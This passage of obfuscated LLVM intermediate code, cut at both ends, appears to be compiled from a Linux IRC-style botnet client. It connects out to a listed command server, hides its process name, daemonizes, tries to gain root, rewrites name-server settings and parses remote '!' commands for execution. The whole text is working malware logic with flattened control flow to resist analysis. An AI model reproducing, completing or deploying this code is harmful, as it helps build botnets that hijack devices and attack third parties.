  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 335142321, label %first
    i32 1575730951, label %8
    i32 -1600647913, label %11
    i32 -2007741233, label %17
    i32 -2082405585, label %18
    i32 -1056489845, label %21
    i32 -368821871, label %32
    i32 -926348532, label %39
    i32 2117529500, label %47
    i32 -1246615371, label %48
    i32 1157039732, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 1575730951, i32 -1600647913
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 -1600647913, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -2007741233, i32 -2082405585
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -1056489845, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -1056489845, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #5
  store i32 23, i32* %3, align 4
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #9
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -368821871, i32 -926348532
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #9
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #9
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #9
  store i8 0, i8* %38, align 1
  store i32 -926348532, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -1246615371, i32 2117529500
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 1157039732, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1157039732, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 0) #5
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 664532922, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 664532922, label %first
    i32 1297477735, label %9
    i32 1718945214, label %17
    i32 465125458, label %18
    i32 -518352598, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ne i32 %.reload, -1
  %8 = select i1 %7, i32 1297477735, i32 1718945214
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.198, i32 0, i32 0), i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = call i64 @strlen(i8* %10) #9
  store i64 %11, i64* %3, align 8
  %12 = load i16, i16* %1, align 2
  %13 = zext i16 %12 to i32
  %14 = load i8*, i8** %2, align 8
  %15 = load i64, i64* %3, align 8
  %16 = call i64 @write(i32 %13, i8* %14, i64 %15)
  store i32 465125458, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -518352598, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = call i32 @close(i32 %20)
  store i32 -518352598, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %18, %17, %9, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 -1726754789, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1726754789, label %first
    i32 -1148525308, label %49
    i32 -2082893933, label %52
    i32 1986529864, label %56
    i32 998427343, label %60
    i32 -261684960, label %61
    i32 -1895056787, label %65
    i32 936529677, label %66
    i32 -809393270, label %67
    i32 -952134230, label %68
    i32 27198543, label %69
    i32 -1518385580, label %70
    i32 931645060, label %71
    i32 749746304, label %76
    i32 1144230953, label %80
    i32 -339351282, label %84
    i32 -1893001751, label %86
    i32 -401063338, label %91
    i32 -2119655959, label %97
    i32 1940036705, label %98
    i32 -168103131, label %104
    i32 -475036443, label %113
    i32 544328034, label %116
    i32 219388031, label %122
    i32 -877535774, label %133
    i32 -1092504445, label %136
    i32 2021246083, label %149
    i32 -1257883159, label %155
    i32 -1883914847, label %165
    i32 -325665024, label %168
    i32 1185933443, label %172
    i32 587768059, label %173
    i32 1369019754, label %176
    i32 -1091846311, label %186
    i32 327714834, label %187
    i32 -1121214710, label %193
    i32 1438667199, label %194
    i32 -1786875585, label %201
    i32 -1040370664, label %204
    i32 -670587097, label %210
    i32 -1046429171, label %215
    i32 1002243685, label %217
    i32 -787673781, label %220
    i32 -86255122, label %226
    i32 1100270413, label %227
    i32 -210954766, label %236
    i32 -129363061, label %246
    i32 1763124916, label %255
    i32 228827514, label %257
    i32 1058890370, label %263
    i32 1009914849, label %265
    i32 -1913992605, label %271
    i32 -902921718, label %276
    i32 1784008293, label %278
    i32 1960317605, label %281
    i32 -579452081, label %286
    i32 -1986670983, label %291
    i32 1446759017, label %300
    i32 -1504828388, label %305
    i32 -1082423121, label %309
    i32 -1037427490, label %315
    i32 -1675951177, label %338
    i32 -1017961945, label %340
    i32 -2066441383, label %346
    i32 -1560166216, label %347
    i32 636822028, label %352
    i32 -571434356, label %357
    i32 1113912671, label %360
    i32 473863048, label %361
    i32 -1588859307, label %362
    i32 803058079, label %363
    i32 -415982920, label %364
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %47 = icmp ne i32 %.reload, 0
  %48 = select i1 %47, i32 -1148525308, i32 -2082893933
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @waitpid(i32 %50, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  %55 = select i1 %54, i32 27198543, i32 1986529864
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = call i32 @fork() #5
  store i32 %57, i32* %8, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 998427343, i32 -261684960
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %8, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 936529677, i32 -1895056787
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -809393270, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -809393270, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -952134230, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -1518385580, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 -1518385580, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 931645060, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0)) #5
  %73 = call i32 @setuid(i32 0) #5
  %74 = call i32 @seteuid(i32 0) #5
  %75 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  store i32 749746304, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 @fork() #5
  %78 = icmp eq i32 %77, 0
  %79 = select i1 %78, i32 1144230953, i32 -415982920
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i32 @initConnection()
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -339351282, i32 -1893001751
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = call i32 @sleep(i32 5)
  store i32 749746304, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = call i8* @getBuild()
  %89 = call i32 @getEndianness()
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %87, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.206, i32 0, i32 0), i8* %88, i32 %89)
  call void @UpdateNameSrvs()
  call void @CleanDevice()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 -401063338, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %94 = call i32 @recvLine(i32 %92, i8* %93, i32 4096)
  store i32 %94, i32* %11, align 4
  %95 = icmp ne i32 %94, -1
  %96 = select i1 %95, i32 -2119655959, i32 803058079
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 1940036705, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = load i64, i64* @numpids, align 8
  %102 = icmp ult i64 %100, %101
  %103 = select i1 %102, i32 -168103131, i32 1369019754
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32*, i32** @pids, align 8
  %106 = load i32, i32* %12, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @waitpid(i32 %109, i32* null, i32 1)
  %111 = icmp sgt i32 %110, 0
  %112 = select i1 %111, i32 -475036443, i32 1185933443
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %14, align 4
  store i32 544328034, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %14, align 4
  %118 = zext i32 %117 to i64
  %119 = load i64, i64* @numpids, align 8
  %120 = icmp ult i64 %118, %119
  %121 = select i1 %120, i32 219388031, i32 -1092504445
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %14, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds i32, i32* %123, i64 %125
  %127 = load i32, i32* %126, align 4
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %14, align 4
  %130 = sub i32 %129, 1
  %131 = zext i32 %130 to i64
  %132 = getelementptr inbounds i32, i32* %128, i64 %131
  store i32 %127, i32* %132, align 4
  store i32 -877535774, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %14, align 4
  %135 = add i32 %134, 1
  store i32 %135, i32* %14, align 4
  store i32 544328034, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %14, align 4
  %139 = sub i32 %138, 1
  %140 = zext i32 %139 to i64
  %141 = getelementptr inbounds i32, i32* %137, i64 %140
  store i32 0, i32* %141, align 4
  %142 = load i64, i64* @numpids, align 8
  %143 = add i64 %142, -1
  store i64 %143, i64* @numpids, align 8
  %144 = load i64, i64* @numpids, align 8
  %145 = add i64 %144, 1
  %146 = mul i64 %145, 4
  %147 = call noalias i8* @malloc(i64 %146) #5
  %148 = bitcast i8* %147 to i32*
  store i32* %148, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 2021246083, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %14, align 4
  %151 = zext i32 %150 to i64
  %152 = load i64, i64* @numpids, align 8
  %153 = icmp ult i64 %151, %152
  %154 = select i1 %153, i32 -1257883159, i32 -325665024
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32*, i32** @pids, align 8
  %157 = load i32, i32* %14, align 4
  %158 = zext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = load i32*, i32** %13, align 8
  %162 = load i32, i32* %14, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  store i32 %160, i32* %164, align 4
  store i32 -1883914847, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %14, align 4
  %167 = add i32 %166, 1
  store i32 %167, i32* %14, align 4
  store i32 2021246083, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32*, i32** @pids, align 8
  %170 = bitcast i32* %169 to i8*
  call void @free(i8* %170) #5
  %171 = load i32*, i32** %13, align 8
  store i32* %171, i32** @pids, align 8
  store i32 1185933443, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  store i32 587768059, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %12, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %12, align 4
  store i32 1940036705, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %178
  store i8 0, i8* %179, align 1
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %180)
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %182 = call i8* @strstr(i8* %181, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %184 = icmp eq i8* %182, %183
  %185 = select i1 %184, i32 -1091846311, i32 327714834
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  store i32 -401063338, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %189 = call i8* @strstr(i8* %188, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.207, i32 0, i32 0)) #9
  %190 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %191 = icmp eq i8* %189, %190
  %192 = select i1 %191, i32 -1121214710, i32 1438667199
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:194:                                    ; preds = %loopEntry
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %195, i8** %15, align 8
  %196 = load i8*, i8** %15, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 33
  %200 = select i1 %199, i32 -1786875585, i32 -1588859307
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %15, align 8
  %203 = getelementptr inbounds i8, i8* %202, i64 1
  store i8* %203, i8** %16, align 8
  store i32 -1040370664, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %16, align 8
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp ne i32 %207, 32
  %209 = select i1 %208, i32 -670587097, i32 -1046429171
  store i32 %209, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i8*, i8** %16, align 8
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp ne i32 %213, 0
  store i32 -1046429171, i32* %switchVar
  store i1 %214, i1* %.reg2mem3
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %216 = select i1 %.reload4, i32 1002243685, i32 -787673781
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8*, i8** %16, align 8
  %219 = getelementptr inbounds i8, i8* %218, i32 1
  store i8* %219, i8** %16, align 8
  store i32 -1040370664, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %16, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 0
  %225 = select i1 %224, i32 -86255122, i32 1100270413
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  store i32 -401063338, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i8*, i8** %16, align 8
  store i8 0, i8* %228, align 1
  %229 = load i8*, i8** %15, align 8
  %230 = getelementptr inbounds i8, i8* %229, i64 1
  store i8* %230, i8** %16, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = load i8*, i8** %16, align 8
  %233 = call i64 @strlen(i8* %232) #9
  %234 = getelementptr inbounds i8, i8* %231, i64 %233
  %235 = getelementptr inbounds i8, i8* %234, i64 2
  store i8* %235, i8** %15, align 8
  store i32 -210954766, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i8*, i8** %15, align 8
  %238 = load i8*, i8** %15, align 8
  %239 = call i64 @strlen(i8* %238) #9
  %240 = sub i64 %239, 1
  %241 = getelementptr inbounds i8, i8* %237, i64 %240
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 10
  %245 = select i1 %244, i32 1763124916, i32 -129363061
  store i32 %245, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i8*, i8** %15, align 8
  %248 = load i8*, i8** %15, align 8
  %249 = call i64 @strlen(i8* %248) #9
  %250 = sub i64 %249, 1
  %251 = getelementptr inbounds i8, i8* %247, i64 %250
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 13
  store i32 1763124916, i32* %switchVar
  store i1 %254, i1* %.reg2mem5
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %256 = select i1 %.reload6, i32 228827514, i32 1058890370
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8*, i8** %15, align 8
  %259 = load i8*, i8** %15, align 8
  %260 = call i64 @strlen(i8* %259) #9
  %261 = sub i64 %260, 1
  %262 = getelementptr inbounds i8, i8* %258, i64 %261
  store i8 0, i8* %262, align 1
  store i32 -210954766, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8*, i8** %15, align 8
  store i8* %264, i8** %17, align 8
  store i32 1009914849, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8*, i8** %15, align 8
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp ne i32 %268, 32
  %270 = select i1 %269, i32 -1913992605, i32 -902921718
  store i32 %270, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8*, i8** %15, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp ne i32 %274, 0
  store i32 -902921718, i32* %switchVar
  store i1 %275, i1* %.reg2mem7
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %277 = select i1 %.reload8, i32 1784008293, i32 1960317605
  store i32 %277, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i8*, i8** %15, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %15, align 8
  store i32 1009914849, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %15, align 8
  store i8 0, i8* %282, align 1
  %283 = load i8*, i8** %15, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %15, align 8
  %285 = load i8*, i8** %17, align 8
  store i8* %285, i8** %18, align 8
  store i32 -579452081, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i8*, i8** %18, align 8
  %288 = load i8, i8* %287, align 1
  %289 = icmp ne i8 %288, 0
  %290 = select i1 %289, i32 -1986670983, i32 1446759017
  store i32 %290, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = load i8*, i8** %18, align 8
  %293 = load i8, i8* %292, align 1
  %294 = zext i8 %293 to i32
  %295 = call i32 @toupper(i32 %294) #9
  %296 = trunc i32 %295 to i8
  %297 = load i8*, i8** %18, align 8
  store i8 %296, i8* %297, align 1
  %298 = load i8*, i8** %18, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %18, align 8
  store i32 -579452081, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %301 = load i8*, i8** %15, align 8
  %302 = call i8* @strtok(i8* %301, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %302, i8** %21, align 8
  %303 = load i8*, i8** %17, align 8
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %303, i8** %304, align 16
  store i32 -1504828388, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8*, i8** %21, align 8
  %307 = icmp ne i8* %306, null
  %308 = select i1 %307, i32 -1082423121, i32 -1017961945
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8*, i8** %21, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp ne i32 %312, 10
  %314 = select i1 %313, i32 -1037427490, i32 -1675951177
  store i32 %314, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i8*, i8** %21, align 8
  %317 = call i64 @strlen(i8* %316) #9
  %318 = add i64 %317, 1
  %319 = call noalias i8* @malloc(i64 %318) #5
  %320 = load i32, i32* %20, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %321
  store i8* %319, i8** %322, align 8
  %323 = load i32, i32* %20, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %324
  %326 = load i8*, i8** %325, align 8
  %327 = load i8*, i8** %21, align 8
  %328 = call i64 @strlen(i8* %327) #9
  %329 = add i64 %328, 1
  call void @llvm.memset.p0i8.i64(i8* %326, i8 0, i64 %329, i32 1, i1 false)
  %330 = load i32, i32* %20, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  %334 = load i8*, i8** %21, align 8
